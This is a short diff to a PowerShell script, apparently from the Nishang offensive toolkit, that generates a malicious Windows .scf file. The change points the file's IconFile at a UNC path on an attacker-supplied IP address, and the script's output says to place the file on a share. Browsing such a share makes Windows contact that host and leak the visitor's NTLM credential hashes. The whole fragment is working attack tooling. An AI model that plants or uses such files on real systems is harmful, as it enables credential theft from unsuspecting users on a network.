@@ -46,7 +46,7 @@ https://github.com/samratashok/nishang
     $scf = @"
 [Shell]
 Command=2
-IconFile=\\$SharePath\share\test.ico
+IconFile=\\$IPAddress\share\test.ico
 [Taskbar]
 Command=ToggleDesktop
 "@
@@ -57,3 +57,4 @@ Command=ToggleDesktop
     Write-Output "Put $OutputPath on a share."
     
 }
+
